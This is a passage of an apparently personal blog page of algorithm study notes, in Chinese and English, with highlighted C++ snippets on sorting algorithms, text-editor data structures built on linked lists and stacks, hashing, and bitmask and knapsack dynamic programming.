class="hljs-params">(<span class="hljs-type">int</span> arr[], <span class="hljs-type">int</span> n)</span> </span>&#123;<br><span class="hljs-type">int</span> m = *<span class="hljs-built_in">max_element</span>(arr, arr + n);<br>    <span class="hljs-comment">// 枚举每一位的顺序</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> exp = <span class="hljs-number">1</span>; m / exp &gt; <span class="hljs-number">0</span>; exp *= <span class="hljs-number">10</span>)<br>        <span class="hljs-built_in">countSort</span>(arr, n, exp);<br>&#125; <br></code></pre></td></tr></table></figure><h3 id="bubble-sort">bubble sort</h3><p>number of inversion pairs 排序过程，每次纠正逆序对 in-place 原地排序直到没有 线段树计算逆序对，贪心构造最大逆序对</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">vi <span class="hljs-title">bubbleSort</span><span class="hljs-params">(vi &amp;arr)</span> </span>&#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sz</span>(arr) &lt;= <span class="hljs-number">1</span>) &#123;<br>          <span class="hljs-keyword">return</span> arr;<br>     &#125;<br>    <br>    <span class="hljs-comment">//记录最后一次交换的位置</span><br>    <span class="hljs-type">int</span> lastExchangeIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 无序数列的边界，每次比较只需要比到这里为止</span><br>    <span class="hljs-type">int</span> sortBorder = <span class="hljs-built_in">sz</span>(arr) - <span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; arr.length - <span class="hljs-number">1</span>; i++) &#123;<br>         <span class="hljs-type">bool</span> isSorted  = <span class="hljs-literal">true</span>; <span class="hljs-comment">//有序标记，每一轮的初始是true</span><br>         <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; sortBorder; j++) &#123;<br>             <span class="hljs-keyword">if</span> (arr[j + <span class="hljs-number">1</span>] &lt; arr[j]) &#123;<br>                 isSorted  = <span class="hljs-literal">false</span>; <span class="hljs-comment">//有元素交换，所以不是有序，标记变为false</span><br>                 <span class="hljs-type">int</span> t = arr[j];<br>                 <span class="hljs-built_in">swap</span>(arr[j], arr[j + <span class="hljs-number">1</span>]);<br>                 lastExchangeIndex = j;<br>             &#125;<br>         &#125;<br> sortBorder = lastExchangeIndex;<br>         <span class="hljs-comment">//一趟下来是否发生位置交换，如果没有交换直接跳出大循环</span><br>         <span class="hljs-keyword">if</span>(isSorted)<br>              <span class="hljs-keyword">break</span>;<br>     &#125;<br>     <span class="hljs-keyword">return</span> arr;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="选择排序">选择排序</h3><p>每次遍历选择一位，最大位 swap</p><h3 id="cycle-sort">cycle sort</h3><p>swap cycle</p><p><ahref="https://blog.csdn.net/yunxiaoqinghe/article/details/113153795">交换次数</a></p><p><img src="/images/swap-1.png" alt="swap" style="zoom: 67%;" /></p><p>若存在一个圈有两个相同的值，可以通关交换增加环的个数 <ahref="https://www.cnblogs.com/kkun/archive/2011/11/28/2266559.html">圈排序</a>不断寻找直到遇到需要替换到原来位置的元素</p><p>补充说明： ？是否一定成环 - ? 可能提前成环 a-&gt;b-&gt;c-&gt;b随便搜索可能找不到一个可以回到A的回路 b-&gt;c-&gt;b作为一个子环。a-&gt;b-&gt;d-&gt;a 才是真实的环 -&gt; 至多搜索6次 -&gt;不能直接删除, 找到环后结束搜索。 链越短越好?</p><p><img src="/images/swap-2.png" alt="image-20220426173644799" style="zoom:67%;" /></p><h3 id="计数排序">计数排序</h3><p>利用大空间，直接存储到值对应的位置，顺序输出。</p><h2 id="结构">结构</h2><h3 id="双向链表">双向链表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 直接调用</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TextEditor</span> &#123;<br>    list&lt;<span class="hljs-type">char</span>&gt; lst;<br>    list&lt;<span class="hljs-type">char</span>&gt;::iterator cur;<br><br>    <span class="hljs-function">string <span class="hljs-title">print</span><span class="hljs-params">()</span> </span>&#123;<br>        string ret;<br>        <span class="hljs-keyword">auto</span> it = cur;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            <span class="hljs-keyword">if</span> (it == lst.<span class="hljs-built_in">begin</span>()) <span class="hljs-keyword">break</span>;<br>            it = <span class="hljs-built_in">prev</span>(it);<br>            ret.<span class="hljs-built_in">push_back</span>(*it);<br>        &#125;<br>        <span class="hljs-built_in">reverse</span>(ret.<span class="hljs-built_in">begin</span>(), ret.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">TextEditor</span>() &#123;<br>        cur = lst.<span class="hljs-built_in">begin</span>();<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addText</span><span class="hljs-params">(string text)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : text) lst.<span class="hljs-built_in">insert</span>(cur, c);<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">deleteText</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (k &amp;&amp; cur != lst.<span class="hljs-built_in">begin</span>()) &#123;<br>            cur = <span class="hljs-built_in">prev</span>(cur);<br>            cur = lst.<span class="hljs-built_in">erase</span>(cur);<br>            k--; ret++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <br>    <span class="hljs-function">string <span class="hljs-title">cursorLeft</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-keyword">while</span> (k &amp;&amp; cur != lst.<span class="hljs-built_in">begin</span>()) &#123;<br>            cur = <span class="hljs-built_in">prev</span>(cur);<br>            k--;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>();<br>    &#125;<br>    <br>    <span class="hljs-function">string <span class="hljs-title">cursorRight</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-keyword">while</span> (k &amp;&amp; cur != lst.<span class="hljs-built_in">end</span>()) &#123;<br>            cur = <span class="hljs-built_in">next</span>(cur);<br>            k--;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>();<br>    &#125;<br>&#125;;<br><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span> &#123;<br>    node *nxt = <span class="hljs-literal">nullptr</span>;<br>    node *pre = <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-type">char</span> v;<br>    <span class="hljs-built_in">node</span>(<span class="hljs-type">char</span> _v) &#123;<br>        v = _v;<br>    &#125;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TextEditor</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    node *head, *cur;<br>    <span class="hljs-built_in">TextEditor</span>() &#123;<br>        <span class="hljs-comment">// 设置哨兵</span><br>        head = <span class="hljs-keyword">new</span> <span class="hljs-built_in">node</span>(<span class="hljs-string">&#x27;*&#x27;</span>);<br>        cur = head;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addText</span><span class="hljs-params">(string text)</span> </span>&#123;<br>        node *tmp = <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-keyword">if</span> (cur &amp;&amp; cur-&gt;nxt) tmp = cur-&gt;nxt; <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; text.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            cur-&gt;nxt = <span class="hljs-keyword">new</span> <span class="hljs-built_in">node</span>(text[i]);<br>            cur-&gt;nxt-&gt;pre = cur;<br>            cur = cur-&gt;nxt;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (tmp) &#123;<br>            cur-&gt;nxt = tmp;<br>            tmp-&gt;pre = cur;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">deleteText</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span> </span>&#123;<br>        node *f = <span class="hljs-number">0</span>;<br>        node* nn = <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-keyword">if</span> (cur-&gt;nxt) &#123;<br>            nn = cur-&gt;nxt;<br>        &#125;<br>        <span class="hljs-type">int</span> lk = k;<br>        <span class="hljs-keyword">while</span> (cur-&gt;v != <span class="hljs-string">&#x27;*&#x27;</span> &amp;&amp; k) &#123;<br>            cur-&gt;pre-&gt;nxt = nn;<br>            <span class="hljs-keyword">if</span> (nn) &#123;<br>                nn-&gt;pre = cur-&gt;pre;<br>            &#125;<br>            cur = cur-&gt;pre;<br>            k--;<br>        &#125;<br>        <span class="hljs-keyword">return</span> lk - k;<br>    &#125;<br><br>    <span class="hljs-function">string <span class="hljs-title">cursorLeft</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-type">int</span> mm = <span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">while</span> (cur-&gt;v != <span class="hljs-string">&#x27;*&#x27;</span> &amp;&amp; k) &#123;<br>            cur = cur-&gt;pre;<br>            k--;<br>        &#125;<br>        string s = <span class="hljs-string">&quot;&quot;</span>;<br>        node *tmp = cur;<br>        <span class="hljs-keyword">while</span> (tmp-&gt;v != <span class="hljs-string">&#x27;*&#x27;</span> &amp;&amp; mm) &#123;<br>            s += tmp-&gt;v;<br>            tmp = tmp-&gt;pre;<br>            mm--;<br>        &#125;<br>        <span class="hljs-built_in">reverse</span>(s.<span class="hljs-built_in">begin</span>(), s.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>    <br>    <span class="hljs-function">string <span class="hljs-title">cursorRight</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-type">int</span> mm = <span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">while</span> (cur-&gt;nxt != <span class="hljs-literal">nullptr</span> &amp;&amp; k) &#123;<br>            cur = cur-&gt;nxt;<br>            k--;<br>        &#125;<br>        string s = <span class="hljs-string">&quot;&quot;</span>;<br>        node *tmp = cur;<br>        <span class="hljs-keyword">while</span> (tmp-&gt;v != <span class="hljs-string">&#x27;*&#x27;</span> &amp;&amp; mm) &#123;<br>            s += tmp-&gt;v;<br>            tmp = tmp-&gt;pre;<br>            mm--;<br>        &#125;<br>        <span class="hljs-built_in">reverse</span>(s.<span class="hljs-built_in">begin</span>(), s.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="十字链表-lfu">十字链表 LFU</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// LFU 缓存 frequency</span><br><br><span class="hljs-comment">// LRU least recentl</span><br></code></pre></td></tr></table></figure><h3 id="对顶栈">对顶栈</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TextEditor</span> &#123;<br><span class="hljs-keyword">public</span>: <br>    stack&lt;<span class="hljs-type">char</span>&gt; left, right;<br>    <span class="hljs-built_in">TextEditor</span>() &#123;&#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addText</span><span class="hljs-params">(string text)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c:text) left.<span class="hljs-built_in">push</span>(c);<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">deleteText</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span> </span>&#123;<br>        k = <span class="hljs-built_in">min</span>(k, (<span class="hljs-type">int</span>)left.<span class="hljs-built_in">size</span>());<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; k; i++) left.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">return</span> k;<br>    &#125;<br><br>    <span class="hljs-function">string <span class="hljs-title">text</span><span class="hljs-params">()</span> </span>&#123;<br>        string res;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, k = <span class="hljs-built_in">min</span>((<span class="hljs-type">int</span>)left.<span class="hljs-built_in">size</span>(), <span class="hljs-number">10</span>); i &lt; k; i++) &#123;<br>            res.<span class="hljs-built_in">insert</span>(res.<span class="hljs-built_in">begin</span>(), left.<span class="hljs-built_in">top</span>());<br>            left.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-built_in">addText</span>(res);<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>    <br>    <span class="hljs-function">string <span class="hljs-title">cursorLeft</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span> </span>&#123;<br>        k = <span class="hljs-built_in">min</span>(k, (<span class="hljs-type">int</span>)left.<span class="hljs-built_in">size</span>());<br>        <span class="hljs-keyword">while</span> (k--) &#123;<br>            right.<span class="hljs-built_in">push</span>(left.<span class="hljs-built_in">top</span>());<br>            left.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">text</span>();<br>    &#125;<br>    <br>    <span class="hljs-function">string <span class="hljs-title">cursorRight</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span> </span>&#123;<br>        k = <span class="hljs-built_in">min</span>(k, (<span class="hljs-type">int</span>)right.<span class="hljs-built_in">size</span>());<br>        <span class="hljs-keyword">while</span> (k--) &#123;<br>            left.<span class="hljs-built_in">push</span>(right.<span class="hljs-built_in">top</span>());<br>            right.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">text</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="set">set</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> p1 = <span class="hljs-built_in">prev</span>(s1.<span class="hljs-built_in">lb</span>(x));<br><span class="hljs-keyword">if</span> (arr[*p1] &gt; arr[x]) &#123;<br>    s1.<span class="hljs-built_in">insert</span>(x); <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> p = <span class="hljs-built_in">next</span>(s1.<span class="hljs-built_in">find</span>(x)); p != s1.<span class="hljs-built_in">end</span>(); p++) &#123;<br>        <span class="hljs-type">int</span> id = *p;<br>        <span class="hljs-keyword">if</span> (arr[x] &lt;= arr[id]) &#123;<br>            dd.<span class="hljs-built_in">pub</span>(id);      <br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">rep</span> (i, <span class="hljs-number">0</span>, <span class="hljs-built_in">sz</span>(dd)) s1.<span class="hljs-built_in">erase</span>(dd[i]);                      <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="hash">hash</h3><ol type="1"><li>! hash collision, 也可通过设置两组哈希的trick实现生日悖论：365的空间装23组数据，出现哈希碰撞的概率超过1/2 因此MOD通常要远大于储存数据数的平方，且多采用质数。</li><li>线性探测 / 两组哈希综合判断。</li><li>O(n^2) - 若允许n*log - 使用红黑树，较为稳定。</li></ol><p><a href="#string_hash">string</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// is guaranteed to be at least 32767 %...</span><br><br><span class="hljs-function">ll <span class="hljs-title">codec</span><span class="hljs-params">(ll x, ll y)</span> </span>&#123;<br>    x += <span class="hljs-number">1e9</span> + <span class="hljs-number">5</span>;<br>    y += <span class="hljs-number">1e9</span> + <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">return</span> (x &lt;&lt; <span class="hljs-number">32</span>) + y;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decode</span><span class="hljs-params">(<span class="hljs-type">const</span> ll &amp;v, ll &amp;x, ll &amp;y)</span> </span>&#123;<br>    x = v &gt;&gt; <span class="hljs-number">32</span>;<br>    y = v &amp; ((<span class="hljs-number">1ll</span> &lt;&lt; <span class="hljs-number">32</span>) - <span class="hljs-number">1</span>);<br>    x -= <span class="hljs-number">1e9</span> + <span class="hljs-number">5</span>;<br>    y -= <span class="hljs-number">1e9</span> + <span class="hljs-number">5</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">gethash</span><span class="hljs-params">(<span class="hljs-type">int</span> base, <span class="hljs-type">int</span> mod)</span> </span>&#123;<br>    <span class="hljs-type">int</span> hashvalue = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;x: temp) &#123;<br>    <span class="hljs-comment">// maybe exsit negative </span><br>        hashvalue = <span class="hljs-number">1ll</span> * hashvalue * base % mod + (x + <span class="hljs-number">101</span>);<br>        hashvalue %= mod;<br>    &#125;<br>    <span class="hljs-keyword">return</span> hashvalue;<br>&#125;<br><span class="hljs-built_in">gethash</span>(<span class="hljs-number">263</span>, <span class="hljs-built_in">int</span>(<span class="hljs-number">1e9</span>) + <span class="hljs-number">7</span>);<br><br><span class="hljs-comment">// 树哈希 树的同构问题 若哈希值</span><br><br><span class="hljs-comment">// 随机哈希</span><br><br><br><span class="hljs-comment">// 线性探测</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">mov</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; &amp;arr, <span class="hljs-type">int</span> pos)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (arr[pos] == <span class="hljs-number">0</span>) &#123;<br>        arr[pos] = pos + <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">return</span> pos + <span class="hljs-number">1</span>; <br>    &#125;<br>    arr[pos] = <span class="hljs-built_in">mov</span>(arr, arr[pos]);<br>    <span class="hljs-keyword">return</span> arr[pos];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="dp">DP</h2><h3 id="maskmap">mask/map</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 1e6 * 30 * 26 -- 1e9</span><br>unordered_map&lt;<span class="hljs-type">long</span> <span class="hljs-type">long</span>, <span class="hljs-type">long</span> <span class="hljs-type">long</span>&gt; dp;<br><span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">codec</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> cur)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> l * <span class="hljs-number">100100</span> + r*<span class="hljs-number">100</span> + cur;<br>&#125;<br><br><br><span class="hljs-comment">// ！subset</span><br><span class="hljs-comment">// lowbit</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lowbit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> x &amp; (-x);<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> sub = mask; sub; sub = (sub - <span class="hljs-number">1</span>) &amp; mask) &#123;<br>    <span class="hljs-comment">// sub...</span><br>&#125;<br><span class="hljs-comment">// 状态压缩枚举子集</span><br><span class="hljs-comment">// 注意 ^ 是在arr[i] 完全包含时才代表子集，否则会影响值</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = mask - <span class="hljs-number">1</span>; j &gt; <span class="hljs-number">-1</span>; j--) &#123;<br>        dp[j] = <span class="hljs-built_in">min</span>(dp[j], dp[j &amp; (j ^ arr[i])] + <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 采用后向定义的方式更为高效</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span> ; i &lt; n ; i ++)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span> ; j &lt; <span class="hljs-number">21</span> ; j ++)&#123;<br>        <span class="hljs-keyword">if</span>(!(i &gt;&gt; j &amp; <span class="hljs-number">1</span>)) <span class="hljs-keyword">continue</span> ;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k = <span class="hljs-number">0</span> ; k &lt; <span class="hljs-number">21</span> ; k ++) &#123;<br>            <span class="hljs-comment">// 右移 &amp; 1, 防止重复更新</span><br>            <span class="hljs-keyword">if</span>(!g[j][k] || (i &gt;&gt; k &amp; <span class="hljs-number">1</span>)) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-comment">// 跳过 i + (1 &lt;&lt; k)</span><br>            dp[i + (<span class="hljs-number">1</span> &lt;&lt; k)][k] += dp[i][j];<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="path">path</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 二维背包路径 - 不同于一维</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = target; j &gt; <span class="hljs-number">-1</span>; j--) &#123;<br>        <span class="hljs-comment">// 注意不同于一维背包的省略</span><br>        dp[i][j] = dp[i - <span class="hljs-number">1</span>][j];<br>        <span class="hljs-keyword">if</span> (j &gt;= res[i - <span class="hljs-number">1</span>])   <br>            dp[i][j] = <span class="hljs-built_in">max</span>(dp[i][j], dp[i - <span class="hljs-number">1</span>][j - res[i - <span class="hljs-number">1</span>]] + res[i - <span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="记忆化">记忆化</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 记忆化注意使用void</span><br><span class="hljs-keyword">if</span> (!dp[l][j - <span class="hljs-number">1</span>].<span 